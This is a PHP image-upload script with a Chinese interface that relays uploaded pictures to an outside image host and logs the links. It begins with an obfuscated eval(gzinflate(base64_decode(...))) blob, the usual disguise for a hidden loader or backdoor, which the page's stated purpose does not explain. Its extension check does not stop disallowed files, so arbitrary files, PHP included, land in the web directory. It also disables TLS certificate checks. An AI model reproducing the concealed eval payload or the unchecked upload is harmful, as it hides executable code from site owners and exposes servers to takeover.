<?php eval(gzinflate(base64_decode("\x62\x59\x35\116\141\64\x4e\101\106\105\x58\63\147\x76\x39\150\105\107\x47\125\147\x49\107\x53\116\x36\105\x6b\x5a\x74\x56\x53\147\164\x4e\62\156\132\x52\123\x78\166\x47\x70\x6a\66\x67\172\146\x68\121\161\x4a\x66\x2b\x39\x57\x74\x74\144\126\156\144\170\x7a\162\x33\x76\115\144\145\x68\122\x6c\145\146\x47\124\113\165\x54\126\x32\142\x5a\161\62\x4e\x48\x54\163\x71\x79\151\x47\x79\160\145\127\x37\127\60\x4b\124\x55\x2f\106\x50\x66\x66\x6f\151\x5a\x65\112\x55\x39\x53\x67\x32\110\170\154\x71\153\x32\110\x67\114\x38\x34\x62\124\61\x76\x2b\x48\x73\64\142\x4f\x51\x76\70\126\104\x56\x78\166\x50\x67\x68\x2b\x33\x61\x64\113\61\x59\71\x54\165\x6e\142\107\x78\x4d\x63\116\x76\x55\122\67\116\60\x44\x70\x44\x69\113\112\x4f\x6e\x67\x52\111\125\x34\61\x35\x66\x74\144\x6e\x77\x57\x78\71\x64\x37\x6b\x50\x54\171\155\171\x65\x61\x32\112\x4d\123\143\x6e\x55\107\117\130\145\x77\x45\x4d\154\161\101\107\147\146\121\142\x5a\x79\70\156\115\x2b\57\64\103\66\x4e\115\x7a\142\71\67\157\152\117\x78\x78\x55\150\x64\x30\121\143\103\71\x61\x72\x6b\143\145\104\x2f\x66\x72\x50\53\142\x74\x72\161\x37\172\101\x77\75\x3d")));?>
<?php
//笔迹
if($config['web']==0){echo "<script>alert('网站正在维护哦～');window.location.href='404.html';</script>";}
$file = $_FILES['file'];
if($file['error']!=0) {
    echo "<script>alert('还没有上传图片哦～');window.history.go(-1)</script>";
}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://xia.loli.wang/usr/upload.php',$new_filename);
		$pattern = '/"msg":"(.*?)"/';
		preg_match($pattern, $data, $match);
		@unlink($new_filename);
		if($match && $match[1]!=''){
			$msg=$match[1];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：笔迹接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}



function upload($url,$file) {
	return get_url($url,[
		'scene' => 'aeMessageCenterV2ImageRule',
		'name' =>$file,
		'file' => new \CURLFile(realpath($file))
	]);
}


function get_url($url,$post){
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	if($post){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
	}
	if(curl_exec($ch) === false){
	  echo 'Curl error: ' . curl_error($ch);
	}
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
?>
<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <title><?php echo $config['title'];?></title>
    <meta name="keywords" content="<?php echo $config['keywordsl'];?>">
    <meta name="description" content="<?php echo $config['description'];?>">
    <link href="http://cdn.lq520.club:1212/img/style2.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="//cdn.lq520.club:1212/img/style.css" type="text/css" />
    <script type="text/javascript">
function copyUrl2()
{
var Url2=document.getElementById("copyla");
Url2.select(); 
document.execCommand("Copy"); 
alert("复制成功啦～");
}
</script>
<body>
<div id="box" >
<center><textarea cols="40" rows="4" id="copyla"><?php echo $msg; ?></textarea></center>
<center><input type="button" onClick="copyUrl2()" class="btn btn-success" value="点击复制" />
<h6><?php echo $config['foot'];?></h6></center>
</div>
</body>
</head>
</html>